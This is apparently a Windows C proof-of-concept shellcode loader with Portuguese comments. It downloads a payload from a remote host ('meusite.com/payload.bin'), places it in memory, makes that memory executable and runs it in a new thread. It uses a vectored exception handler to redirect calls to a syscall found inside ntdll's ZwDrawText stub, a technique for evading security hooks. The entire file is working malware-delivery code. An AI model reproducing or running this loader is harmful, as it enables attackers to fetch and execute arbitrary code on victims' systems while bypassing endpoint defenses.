#include <windows.h>
#include <winhttp.h>
#include <stdio.h>

#pragma comment(lib, "winhttp.lib")

SIZE_T G_SYSCALL_ADDR = 0;  // Endereço global da syscall

// Função para encontrar o endereço da syscall a partir de uma base
BYTE* FindSyscallAddr(BYTE* base) {
    BYTE* func_base = base;
    BYTE* temp_base = NULL;

    // 0F 05 syscall
    while (*func_base != 0xC3) {
        temp_base = func_base;
        if (*temp_base == 0x0F) {
            temp_base++;
            if (*temp_base == 0x05) {
                temp_base++;
                if (*temp_base == 0xC3) {
                    return func_base;
                }
            }
        }
        func_base++;
    }

    return NULL;
}

// Manipulador de exceção para modificar o contexto e redirecionar para a syscall
LONG WINAPI HandleException(EXCEPTION_POINTERS* ExceptionInfo) {
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
        CONTEXT* context = ExceptionInfo->ContextRecord;
        context->R10 = context->Rcx;
        context->Rax = context->Rip;
        context->Rip = G_SYSCALL_ADDR;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_EXECUTE_HANDLER;
}

// Função para baixar o payload de uma URL
BYTE* DownloadPayload(LPCWSTR host, LPCWSTR path, INTERNET_PORT port, BOOL is_https, DWORD* payload_size) {
    DWORD flags = is_https ? WINHTTP_FLAG_SECURE : 0;

    HINTERNET hSession = WinHttpOpen(L"HTTP Downloader", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        printf("[-] Failed to open WinHTTP session\n");
        return NULL;
    }

    HINTERNET hConnect = WinHttpConnect(hSession, host, port, 0);
    if (!hConnect) {
        printf("[-] Failed to connect to server\n");
        WinHttpCloseHandle(hSession);
        return NULL;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest) {
        printf("[-] Failed to open HTTP request\n");
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return NULL;
    }

    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) || !WinHttpReceiveResponse(hRequest, NULL)) {
        printf("[-] HTTP/HTTPS request failed\n");
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return NULL;
    }

    DWORD size = 0, downloaded = 0, total_size = 0;
    BYTE* buffer = NULL;
    BYTE* temp_buffer = NULL;

    do {
        WinHttpQueryDataAvailable(hRequest, &size);
        if (size == 0) break;

        temp_buffer = realloc(buffer, total_size + size);
        if (!temp_buffer) {
            printf("[-] Memory allocation failed\n");
            free(buffer);
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return NULL;
        }
        buffer = temp_buffer;

        WinHttpReadData(hRequest, buffer + total_size, size, &downloaded);
        total_size += downloaded;

    } while (size > 0);

    *payload_size = total_size;

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;
}

void VectoredSyscallPOC(BYTE* payload, size_t payload_size) {
    // Obtenção da handle do ntdll.dll
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (ntdll == NULL) {
        printf("[-] Error GetModuleHandleA\n");
        return;
    }

    // Resolução da função ZwDrawText
    FARPROC drawtext = GetProcAddress(ntdll, "ZwDrawText");
    if (drawtext == NULL) {
        printf("[-] Error GetProcAddress\n");
        return;
    }

    // Encontrar o endereço da syscall
    BYTE* syscall_addr = FindSyscallAddr((BYTE*)drawtext);
    if (syscall_addr == NULL) {
        printf("[-] Error Resolving syscall Address\n");
        return;
    }

    G_SYSCALL_ADDR = (SIZE_T)syscall_addr;

    // Adicionar o manipulador de exceção
    AddVectoredExceptionHandler(1, HandleException);

    // Alocação de memória no próprio processo
    LPVOID local_base = VirtualAlloc(NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (local_base == NULL) {
        printf("[-] Allocation Failed\n");
        return;
    }

    // Escrever o payload na memória local
    memcpy(local_base, payload, payload_size);

    // Alterar proteção de memória para execução
    DWORD old_protection;
    if (!VirtualProtect(local_base, payload_size, PAGE_EXECUTE_READ, &old_protection)) {
        printf("[-] Failed to change memory protection from RW to RX\n");
        VirtualFree(local_base, 0, MEM_RELEASE);
        return;
    }

    // Criar uma thread para executar o payload no próprio processo
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)local_base, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("[-] Failed to Execute Thread\n");
    }
    else {
        printf("[+] Injected shellcode into self!!\n");
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }
}

int main() {
    // Exemplo de URL: https://meusite.com:443/payload.bin
    DWORD payload_size = 0;
    BYTE* payload = DownloadPayload(L"meusite.com", L"/payload.bin", 443, TRUE, &payload_size);

    if (payload == NULL) {
        printf("[-] Failed to download payload\n");
        return -1;
    }

    // Função que processa o payload baixado
    VectoredSyscallPOC(payload, payload_size);

    free(payload);
    return 0;
}
